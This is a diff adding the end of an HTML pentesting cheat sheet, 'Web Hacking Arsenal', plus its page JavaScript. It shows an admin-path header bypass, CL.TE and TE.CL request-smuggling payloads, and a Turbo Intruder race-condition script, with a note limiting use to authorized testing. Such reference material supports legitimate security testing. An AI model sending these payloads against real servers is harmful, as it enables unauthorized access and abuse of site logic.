+X-Original-URL: /admin
+X-Rewrite-URL: /admin</code></pre>
+
+                <h3>HTTP Request Smuggling</h3>
+                <pre><code># CL.TE
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+
+# TE.CL
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+GET /admin HTTP/1.1
+Host: target.com
+
+0</code></pre>
+
+                <h3>Race Conditions</h3>
+                <div class="tip">
+                    Send multiple requests simultaneously to exploit timing windows in transactions, discounts, or resource limits.
+                </div>
+                <pre><code># Turbo Intruder script
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                          concurrentConnections=10)
+    for i in range(100):
+        engine.queue(target.req)
+
+def handleResponse(req, interesting):
+    table.add(req)</code></pre>
+
+                <div class="warning">
+                    These payloads are for authorized testing only. Unauthorized testing is illegal. WANG TSWARA!!
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="back-to-top" id="backToTop" onclick="scrollToTop()">↑</div>
+
+    <footer>
+        <p>© 2025 Yamashita - Cyber Samurai | Web Hacking Arsenal</p>
+        <p><em>"In pentesting, as in battle, preparation and knowledge are the keys to victory."</em></p>
+    </footer>
+
+    <script>
+        // Tab switching
+        function showSection(sectionId) {
+            // Hide all sections
+            document.querySelectorAll('.section').forEach(section => {
+                section.classList.remove('active');
+            });
+            
+            // Remove active class from all buttons
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            
+            // Show selected section
+            document.getElementById(sectionId).classList.add('active');
+            
+            // Add active class to clicked button
+            event.target.classList.add('active');
+            
+            // Scroll to top
+            window.scrollTo(0, 0);
+        }
+
+        // Search functionality
+        document.getElementById('searchBox').addEventListener('input', function(e) {
+            const searchTerm = e.target.value.toLowerCase();
+            
+            document.querySelectorAll('.section').forEach(section => {
+                const content = section.textContent.toLowerCase();
+                if (content.includes(searchTerm)) {
+                    section.style.display = 'block';
+                } else {
+                    section.style.display = 'none';
+                }
+            });
+
+            // If search is empty, show only active section
+            if (searchTerm === '') {
+                document.querySelectorAll('.section').forEach(section => {
+                    if (section.classList.contains('active')) {
+                        section.style.display = 'block';
+                    } else {
+                        section.style.display = 'none';
+                    }
+                });
+            }
+        });
+
+        // Back to top button
+        window.addEventListener('scroll', function() {
+            const backToTop = document.getElementById('backToTop');
+            if (window.pageYOffset > 300) {
+                backToTop.classList.add('visible');
+            } else {
+                backToTop.classList.remove('visible');
+            }
+        });
+
+        function scrollToTop() {
+            window.scrollTo({
+                top: 0,
+                behavior: 'smooth'
+            });
+        }
+
+        // Copy code on click
+        document.querySelectorAll('pre code').forEach(block => {
+            block.addEventListener('click', function() {
+                const text = this.textContent;
+                navigator.clipboard.writeText(text).then(() => {
+                    // Visual feedback
+                    const original = this.style.background;
+                    this.style.background = 'rgba(212, 175, 55, 0.2)';
+                    setTimeout(() => {
+                        this.style.background = original;
+                    }, 200);
+                });
+            });
+        });
+
+        // Keyboard shortcuts
+        document.addEventListener('keydown', function(e) {
+            // Press 's' to focus search
+            if (e.key === 's' && !e.ctrlKey && !e.metaKey) {
+                if (document.activeElement !== document.getElementById('searchBox')) {
+                    e.preventDefault();
+                    document.getElementById('searchBox').focus();
+                }
+            }
+            
+            // Press 'Esc' to clear search
+            if (e.key === 'Escape') {
+                document.getElementById('searchBox').value = '';
+                document.getElementById('searchBox').dispatchEvent(new Event('input'));
+            }
+        });
+    </script>
+</body>
+</html>
